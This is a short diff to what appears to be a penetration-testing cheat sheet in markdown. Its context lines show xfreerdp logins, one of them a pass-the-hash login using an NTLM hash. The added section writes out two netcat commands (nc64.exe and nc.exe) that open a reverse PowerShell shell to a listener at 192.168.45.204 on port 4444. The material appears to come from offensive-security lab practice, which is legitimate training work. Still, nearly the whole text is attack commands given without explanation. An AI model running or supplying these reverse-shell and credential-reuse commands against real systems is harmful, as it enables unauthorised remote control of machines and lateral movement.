@@ -34,3 +34,11 @@ xfreerdp3 /v:$target /u:'username' /p:'password' /cert:ignore +clipboard /dynami
 ```sh
 xfreerdp /v:192.168.2.141 /u:admin /pth:A9FDFA038C4B75EBC76DC855DD74F0DA
 ```
+
+# nc.exe powershell
+
+```sh
+nc64.exe 192.168.45.204 4444 -e powershell
+
+nc.exe 192.168.45.204 4444 -e powershell
+```
